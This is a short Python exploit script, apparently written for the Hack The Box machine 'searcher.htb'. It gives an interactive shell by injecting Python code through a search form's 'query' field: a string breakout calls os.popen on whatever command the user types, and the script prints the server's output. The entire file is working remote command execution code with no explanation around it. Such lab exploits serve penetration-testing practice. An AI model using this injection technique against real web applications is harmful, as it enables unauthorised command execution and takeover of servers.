import requests
import urllib.parse

usr_input='start'
while usr_input != 'done':

    usr_input = input('$')
    query = "'+str(__import__('os').popen('" + usr_input + "').read())+'"
    
    r = requests.post('http://searcher.htb/search', data={'engine': 'Youtube', 'query': query})
    r_text = r.text
    r_text = r_text.replace('https://www.youtube.com/results?search_query=', '')
    r_text = urllib.parse.unquote(r_text)
    print(r_text)


    